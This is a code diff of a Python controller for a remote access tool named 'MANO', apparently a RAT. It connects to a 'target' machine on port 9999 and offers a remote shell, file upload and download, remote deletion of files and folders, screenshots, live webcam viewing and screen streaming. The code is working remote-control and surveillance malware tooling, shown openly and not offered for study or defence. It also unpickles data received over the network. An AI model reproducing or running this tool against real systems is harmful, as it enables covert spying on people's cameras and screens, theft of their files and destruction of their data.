@@ -1,326 +1,410 @@
 #copyright © 2019-2024 manoharkakumani
-
 import socket
 import sys
 import os
 import time
 import shutil
 import cv2
+import pyautogui
 import pickle
 import struct
 import numpy as np
 
-# Display banner
-def display_banner():
-    print("*******************************************************")
-    print("""
+#banner
+print("*******************************************************")
+print("""
  __  __    _    _   _  ___   __   
 |  \/  |  / \  | \ | |/ _ \  \ \  
 | |\/| | / _ \ |  \| | | | |  \ \ 
 | |  | |/ ___ \| |\  | |_| |  / / 
 |_|  |_/_/   \_\_| \_|\___/  /_/
 copyright © 2019-2024 manoharkakumani""")
-    print("\n******************************************************")
-
-# Create and connect socket
-def create_and_connect_socket():
+print("\n******************************************************")
+#socket creating
+def sock():
     try:
         s = socket.socket()
-        host = input('Enter Target IP or q or Q to exit :')
-        if host.lower() == 'q':
-            sys.exit(0)
+        host= input('Enter Target IP or q or Q to exit :')
+        if host=='q' or host=='Q':
+            exit(0)
         port = 9999
         s.connect((host, port))
-        return (host, s)
-    except Exception as e:
-        print("Error in binding: ", e)
-        return create_and_connect_socket()
+        return(host,s)
+    except:
+        print("Error: In binding")
+        return sock()
+#deletemenu
 
-# Delete menu
-def display_delete_menu(context):
+def dmenu(nm):
     print("----------------------------------------------------------------------------")
-    print(f"1. Delete file \n2. Delete Dir/Folder \n3. Change {context} Dir \n4. File list \n5. Exit \n")
+    print("1. Delete file \n2. Delet Dir/Folder \n3. Change "+nm+" Dir \n4. File list \n5. Exit \n")
     print("----------------------------------------------------------------------------")
 
-# Loading animation
-def loading_animation():
-    for progress in range(100, -1, -1):
-        sys.stdout.write("\r|" + "█" * (progress // 2) + "|{0:.2f}%".format(progress))
+#deloading
+def dload():
+    a=100;
+    while int(a)>=0:
+        sys.stdout.write("\r|"+"█"*int(a/2)+"|{0:.2f}".format(a)+ "%  ")
         sys.stdout.flush()
         time.sleep(0.01)
+        a-=1;
 
-# Delete files or folders in client directory
-def delete_client_files_or_folders(conn):
+#delete files or folders in client DIR
+def cdel(conn):
     try:
-        display_delete_menu("client's")
-        choice = int(input("Your Choice: "))
-        if choice == 1:
-            filename = input("Enter file name with extension: ")
-            conn.send(('fdel~' + filename).encode("utf-8"))
-            loading_animation()
-        elif choice == 2:
-            dirname = input("Enter folder name: ")
-            conn.send(('fdel~' + dirname).encode("utf-8"))
-            loading_animation()
-        elif choice == 3:
-            change_client_directory(conn)
-            delete_client_files_or_folders(conn)
-        elif choice == 4:
-            list_client_files(conn)
-            delete_client_files_or_folders(conn)
-        elif choice == 5:
+        dmenu("client's")
+        a=int(input("Your Choice: "))
+        if a==1:
+           fname=input("Enter file name with extention: ")
+           conn.send(('fdel~'+fname).encode("utf-8"))
+           dload()
+        elif a==2:
+           fname=input("Enter folder name: ")
+           conn.send(('fdel~'+fname).encode("utf-8"))
+           dload()
+        elif a==3:
+           cchdir(conn)
+           cdel(conn)
+        elif a==4:
+           cflist(conn)
+           cdel(conn)
+        elif a==5:
             return False
         else:
             print("\nWrong Choice!")
-            delete_client_files_or_folders(conn)
+            cdel(conn)
+        return True
+    except Exception as e:
+        print(e)    
+#delete files or folders in your DIR
+def fdel():
+    try:
+        dmenu("your")
+        a=int(input("Your Choice: "))
+        if a==1:
+           fname=input("Enter file name with extention: ")
+           try:
+                if os.path.isfile(fname):
+                    os.unlink(fname)
+                    dload()
+           except Exception as e:
+                print(e)
+        elif a==2:
+           fname=input("Enter folder name: ")
+           try:
+                if os.path.isdir(fname):
+                    shutil.rmtree(fname)
+                    dload()
+           except Exception as e:
+                print(e)
+        elif a==3:
+           chdir()
+           fdel()
+        elif a==4:
+           flist()
+           fdel()
+        elif a==5:
+            return False
+        else:
+            print("\nWrong Choice!")
+            fdel()
         return True
     except Exception as e:
         print(e)
 
-# Change the working directory
-def change_directory():
+
+
+#Your DIR to change    
+def chdir():
     try:
-        print("Your current working dir: " + os.getcwd())
-        choice = input("Do you want to change (Y/N)? : ").upper()
-        if choice == 'Y':
-            new_dir = input("Enter your DIR to change: ")
-            os.chdir(new_dir)
-            print("New working directory: " + os.getcwd())
-        else:
+        print("Your current working dir :"+os.getcwd())
+        x=input("Do you want to change (Y/N) ? : ").upper()
+        if x=='Y':
+           dire=input("Enter your DIR to change: ")
+           os.chdir(dire)
+           print(os.getcwd())
+        else :
             return
     except Exception as e:
         print(e)
 
-# Change client's working directory
-def change_client_directory(conn):
+#client DIR to change
+
+def cchdir(conn):
     try:
         conn.send(('cdir~s').encode("utf-8"))
-        print("Client's current working dir: " + conn.recv(1024).decode("utf-8"))
-        choice = input("Do you want to change (Y/N)? : ").upper()
-        conn.send(str(choice).encode("utf-8"))
-        if choice == 'Y':
-            new_dir = input("Enter new directory: ")
-            conn.send(new_dir.encode("utf-8"))
-            print("Client's new working dir: " + conn.recv(1024).decode("utf-8"))
-        else:
+        print("client current working dir :"+conn.recv(1024).decode("utf-8"))
+        x=input("Do you want to change (Y/N) ? : ").upper()
+        conn.send(str(x).encode("utf-8"))
+        if x=='Y':
+           dire=input("Enter your DIR to change: ")
+           conn.send((dire).encode("utf-8"))
+           print("client current working dir :"+conn.recv(1024).decode("utf-8"))
+        else :
             return
     except Exception as e:
         print(e)
 
-# List files in current directory
-def list_files():
-    print("Files in current directory:")
-    for file in os.listdir():
-        print(file)
+#Your Working DIR Files
 
-# List client's files
-def list_client_files(conn):
+def flist():
+    print("Your Working DIR Files :\n")
+    for i in os.listdir():
+        print(i)
+
+#Client Working DIR Files
+
+def cflist(conn):
     try:
         conn.send(('flist~s').encode("utf-8"))
-        print("Client's files:")
-        files = pickle.loads(conn.recv(1024))
-        for file in files:
-            print(file)
+        print("Client Working DIR Files")
+        arr=pickle.loads(conn.recv(1024))
+        for i in arr:
+            print(i)
     except Exception as e:
         print(e)
 
-# Upload file to client
-def upload_file_to_client(conn):
+#upload file to client
+
+def fup(conn):
     try:
-        filename = input("Filename to upload: ")
+        filename = input("\nMANO >>Filename? -> ")
         if os.path.isfile(filename):
-            conn.send(str("fup~" + filename).encode("utf-8"))
+            conn.send(str("fup~"+filename).encode("utf-8"))
             conn.send(str.encode("EXISTS " + str(os.path.getsize(filename))))
-            filesize = int(os.path.getsize(filename))
-            user_response = conn.recv(1024).decode("utf-8")
-            if user_response[:2] == 'OK':
+            filesize=int(os.path.getsize(filename))
+            userResponse = conn.recv(1024).decode("utf-8")
+            if userResponse[:2] == 'OK':
                 with open(filename, 'rb') as f:
-                    bytes_to_send = f.read(1024)
-                    conn.send(bytes_to_send)
-                    total_sent = len(bytes_to_send)
-                    while total_sent < filesize:
-                        bytes_to_send = f.read(1024)
-                        total_sent += len(bytes_to_send)
-                        conn.send(bytes_to_send)
-                        sys.stdout.write("\rUploaded: {0:.2f}%".format((total_sent / filesize) * 100))
+                    bytesToSend = f.read(1024)
+                    conn.send(bytesToSend)
+                    totalSend=len(bytesToSend)
+                    while int (totalSend) < int(filesize):
+                        bytesToSend = f.read(1024)
+                        totalSend += len(bytesToSend)
+                        conn.send(bytesToSend)
+                        sys.stdout.write("\r|"+"█"*int((totalSend/float(filesize))*50)+"|{0:.2f}".format((totalSend/float(filesize))*100)+ "%  ")
                         sys.stdout.flush()
                     print("\nUpload Completed!")
         else:
-            print("File does not exist.")
+            print("File Does Not Exist!")
     except Exception as e:
         print(e)
 
-# Download file from client
-def download_file_from_client(conn):
+#download file from client
+
+def fdown(conn):
     try:
-        filename = input("Filename to download: ")
+        print(os.getcwd())
+        filename = input("\nMANO >>Filename? -> ")
         if filename != 'q':
-            conn.send(("fdown~" + filename).encode("utf-8"))
+            conn.send(("fdown~"+filename).encode("utf-8"))
             data = conn.recv(1024).decode("utf-8")
             if data[:6] == 'EXISTS':
-                filesize = int(data[6:])
-                msg = input(f"File exists, {filesize} Bytes, download? (Y/N)? -> ").upper()
+                filesize = data[6:]
+                msg = input("File exists, " + str(filesize) +"Bytes, download? (Y/N)? -> ").upper()
                 if msg == 'Y':
                     conn.send("OK".encode("utf-8"))
-                    with open(filename, 'wb') as f:
+                    f = open(filename, 'wb')
+                    data = (conn.recv(1024))
+                    totalRecv = len(data)
+                    f.write(data)
+                    while int(totalRecv) < int(filesize):
                         data = conn.recv(1024)
-                        total_received = len(data)
+                        totalRecv += len(data)
                         f.write(data)
-                        while total_received < filesize:
-                            data = conn.recv(1024)
-                            total_received += len(data)
-                            f.write(data)
-                            sys.stdout.write("\rDownloaded: {0:.2f}%".format((total_received / filesize) * 100))
-                            sys.stdout.flush()
-                            time.sleep(0.01)
-                        print("\nDownload Complete!")
+                        sys.stdout.write("\r|"+"█"*int((totalRecv/float(filesize))*50)+"|{0:.2f}".format((totalRecv/float(filesize))*100)+ "%  ")
+                        sys.stdout.flush()
+                        time.sleep(0.01)
+                    print("\nDownload Complete!")
+                    f.close()
             else:
-                print("File does not exist.")
+                print("File Does Not Exist!")
     except Exception as e:
         print(e)
-    # Take screenshot from the client
-def take_screenshot_from_client(conn):
+
+#screenshot
+def sshot(conn):
     try:
-        filename = input('Enter Screenshot name to save: ') + ".jpg"
+        filename=str(input('Enter Screenshot name to save: '))+".jpg"
         data = conn.recv(1024).decode("utf-8")
         if data[:6] == 'EXISTS':
-            filesize = int(data[6:])
+            filesize = data[6:]
             conn.send("OK".encode("utf-8"))
-            with open(filename, 'wb') as f:
+            f = open(filename, 'wb')
+            data = (conn.recv(1024))
+            totalRecv = len(data)
+            f.write(data)
+            while int(totalRecv) < int(filesize):
                 data = conn.recv(1024)
-                total_received = len(data)
+                totalRecv += len(data)
                 f.write(data)
-                while total_received < filesize:
-                    data = conn.recv(1024)
-                    total_received += len(data)
-                    f.write(data)
-            print("Screenshot saved as", filename)
         else:
-            print("Failed to take screenshot!")
+            print("Fail to take screenshot!")
+        return
     except Exception as e:
         print(e)
 
-# Access client's camera
-def access_client_camera(conn):
-    try:
-        response = conn.recv(1024).decode("utf-8")
-        if response == "OK":
+#camera
+def cam(conn):
+    K=conn.recv(1024).decode("utf-8")
+    if K=="OK":
+        C=conn.recv(1024).decode("utf-8")
+        if C=="cam":
+            data = b""
+            img = struct.calcsize(">L")
             while True:
-                conn.send("cam".encode('utf-8'))
-                data = b""
-                img_size = struct.calcsize(">L")
-                while len(data) < img_size:
-                    data += conn.recv(4096)
-                img_size = struct.unpack(">L", data[:img_size])[0]
-                data = data[img_size:]
-                while len(data) < img_size:
-                    data += conn.recv(4096)
-                frame_data = data[:img_size]
-                data = data[img_size:]
-                frame = pickle.loads(frame_data, fix_imports=True, encoding="bytes")
-                frame = cv2.imdecode(frame, cv2.IMREAD_COLOR)
-                cv2.imshow('Client Camera', frame)
-                if cv2.waitKey(1) & 0xFF == ord('q'):
+                if (cv2.waitKey(1) == 27) or (cv2.waitKey(1) & 0xFF == ord('q')) or (cv2.waitKey(1) & 0xFF == ord('q')):
+                    conn.send("close".encode('utf-8'))
+                    cv2.destroyAllWindows()
                     break
-            cv2.destroyAllWindows()
+                else:
+                    conn.send("cam".encode('utf-8'))
+                    while len(data) < img:
+                        data += conn.recv(4096)
+                    img_size = data[:img]
+                    data = data[img:]
+                    msg_size = struct.unpack(">L", img_size)[0]
+                    while len(data) < msg_size:
+                        data += conn.recv(4096)
+                    frame=pickle.loads(data[:msg_size], fix_imports=True, encoding="bytes")
+                    data = data[msg_size:]
+                    frame = cv2.imdecode(frame,cv2.IMREAD_COLOR)
+                    cv2.namedWindow('Client Camera', cv2.WINDOW_NORMAL)
+                    cv2.imshow('Client Camera',frame)
         else:
-            print("Camera access failed: ", response)
-    except Exception as e:
-        print(e)
+            print(C)
+    else:
+        print(K)
 
-# Stream client's screen
-def stream_client_screen(conn):
+#screenstreaming
+def stream(conn):
     try:
-        response = conn.recv(1024).decode("utf-8")
-        if response == "OK":
+        K=conn.recv(1024).decode("utf-8")
+        if K=="OK":
             while True:
-                conn.send("sst".encode('utf-8'))
-                data = b""
-                screen_size = struct.calcsize(">L")
-                while len(data) < screen_size:
-                    data += conn.recv(4096)
-                screen_size = struct.unpack(">L", data[:screen_size])[0]
-                data = data[screen_size:]
-                while len(data) < screen_size:
-                    data += conn.recv(4096)
-                frame_data = data[:screen_size]
-                data = data[screen_size:]
-                frame = pickle.loads(frame_data, fix_imports=True, encoding="bytes")
-                frame = cv2.imdecode(frame, cv2.IMREAD_COLOR)
-                cv2.imshow('Client Screen', frame)
-                if cv2.waitKey(1) & 0xFF == ord('q'):
+                if (cv2.waitKey(1) == 27) or (cv2.waitKey(1) & 0xFF == ord('q')) or (cv2.waitKey(1) & 0xFF == ord('q')):
+                    conn.send("close".encode('utf-8'))
+                    cv2.destroyAllWindows()
                     break
-            cv2.destroyAllWindows()
+                else:
+                    data = b""
+                    screen = struct.calcsize(">L")
+                    conn.send("sst".encode('utf-8'))
+                    while len(data) < screen:
+                        data += conn.recv(4096)
+                    screen_size = data[:screen]
+                    data = data[screen:]
+                    msg_size = struct.unpack(">L", screen_size)[0]
+                    while len(data) < msg_size:
+                        data += conn.recv(4096)
+                    frame_data = data[:msg_size]
+                    data = data[msg_size:]
+                    frame=pickle.loads(frame_data, fix_imports=True, encoding="bytes")
+                    frame = cv2.imdecode(frame, cv2.IMREAD_COLOR)
+                    b,g,r = cv2.split(frame)       # get b,g,r
+                    rgb_img = cv2.merge([r,g,b])     # switch it to rgb
+                    cv2.namedWindow('Client Screen', cv2.WINDOW_NORMAL)
+                    cv2.imshow('Client Screen',rgb_img)
+                    cv2.waitKey(1)
         else:
-            print("Screen streaming failed: ", response)
+            print(K)
     except Exception as e:
         print(e)
 
-# Main command interface
-def command_interface(host_ip, conn):
+#commands that perform on client
+def mano(cip,conn):
     while True:
-        command = input(f"MANO >> {host_ip} >> ")
-        if command in command_actions:
-            command_actions[command](conn)
-        elif command == 'back':
+        cli= input("MANO >>"+cip+' >>')
+        if cli=='shell':
+            sendcommands(conn)
+        elif cli=='fdown':
+            fdown(conn)
+        elif cli=='fup':
+            fup(conn)
+        elif cli=='fl':
+            flist()
+        elif cli=='cfl':
+            cflist(conn)
+        elif cli=='cd':
+            chdir()
+        elif cli=='ccd':
+            cchdir(conn)
+        elif cli=='cdel':
+           if(cdel(conn)):
+               print(conn.recv(1024).decode("utf-8"))               
+        elif cli=='fdel':
+             if(fdel()):
+                 print("SUCCESS!")
+        elif cli=='pwd':
+             print("your current working directory :"+os.getcwd())
+        elif cli=='cwd':
+             conn.send(('cwd~s').encode("utf-8"))
+             print("client current working directory :"+conn.recv(1024).decode("utf-8"))
+        elif cli=='sshot':
+             conn.send(('sshot~s').encode("utf-8"))
+             msg=conn.recv(1024).decode("utf-8")
+             if msg=='OK':
+                 sshot(conn)
+             else:
+                 print(msg)
+        elif cli=='cam':
+            conn.send(('cam~s').encode("utf-8"))
+            cam(conn)
+        elif cli=='sst':
+            conn.send(('sst~s').encode("utf-8"))
+            stream(conn)
+        elif cli=='back':
             conn.send(('back~s').encode("utf-8"))
             return
-        elif command == 'exit':
+        elif cli=='exit':
             conn.send(('exit~s').encode("utf-8"))
             return
-        elif command == 'help':
-            display_help()
-        else:
-            print("Command not recognized")
+        elif cli == 'help':
+            print("""
+shell   --> To open cmd or terminal\n
+fdown   --> To download files from target\n
+fup     --> Upload files to client\n
+fl      --> List of files in your current directory\n
+cfl     --> List of files in target's current directory\n
+pwd     --> Get your current directory\n
+cwd     --> Get target's current directory\n
+cd      --> Change your current directory\n
+ccd     --> Change target's current directory\n
+fdel    --> Delete file in your current directory\n
+cdel    --> Delete file from target's current directory\n
+sshot   --> To take screenshot of target's screen\n
+cam     --> To access target camera\n
+sst     --> To stream target screen\n
+help    --> Help \n
+back    --> Back to MANO\n
+exit    --> To terminate : """+cip+"""\n""")
+        else :
+              print("Command not recognized")
 
-# Command actions dictionary
-command_actions = {
-    'shell': send_shell_commands,
-    'fdown': download_file_from_client,
-    'fup': upload_file_to_client,
-    'fl': list_files,
-    'cfl': list_client_files,
-    'cd': change_directory,
-    'ccd': change_client_directory,
-    'cdel': delete_client_files_or_folders,
-    'fdel': delete_files_or_folders,
-    'pwd': lambda: print("Your current directory: " + os.getcwd()),
-    'cwd': get_client_working_directory,
-    'sshot': take_screenshot_from_client,
-    'cam': access_client_camera,
-    'sst': stream_client_screen
-}
+# Send commands to client
+def sendcommands(conn):
+    try:
+        conn.send(("cmd~echo").encode("utf-8"))
+        client_response = str(conn.recv(20480), "utf-8")
+        print(client_response, end="")
+        while True:
+            try:
+                cmd = input('')
+                if cmd== 'quit':
+                    return
+                cmd='cmd~'+cmd
+                if len(str.encode(cmd)) > 0:
+                    conn.send(str.encode(cmd))
+                    client_response = str(conn.recv(20480), "utf-8")
+                    print(client_response, end="")
+            except:
+                print("Error sending commands")
+                break
+    except:
+        print("Error while connecting Shell")
 
-# Display help
-def display_help():
-    print("""
-    shell   --> Open shell on the target\n
-    fdown   --> Download files from the target\n
-    fup     --> Upload files to the target\n
-    fl      --> List files in your current directory\n
-    cfl     --> List files in target's current directory\n
-    cd      --> Change your current directory\n
-    ccd     --> Change target's current directory\n
-    fdel    --> Delete file in your current directory\n
-    cdel    --> Delete file in target's current directory\n
-    pwd     --> Get your current directory\n
-    cwd     --> Get target's current directory\n
-    sshot   --> Take screenshot of target's screen\n
-    cam     --> Access target's camera\n
-    sst     --> Stream target's screen\n
-    back    --> Back to main menu\n
-    exit    --> Exit\n
-    """)
-
-# Get client's working directory
-def get_client_working_directory(conn):
-    conn.send(('cwd~s').encode("utf-8"))
-    print("Client's current working directory: " + conn.recv(1024).decode("utf-8"))
-
-# Main program execution
-if __name__ == "__main__":
-    display_banner()
-    while True:
-        host, socket_conn = create_and_connect_socket()
-        command_interface(host, socket_conn)
+while True:
+    host,s=sock()
+    mano(host,s)
 
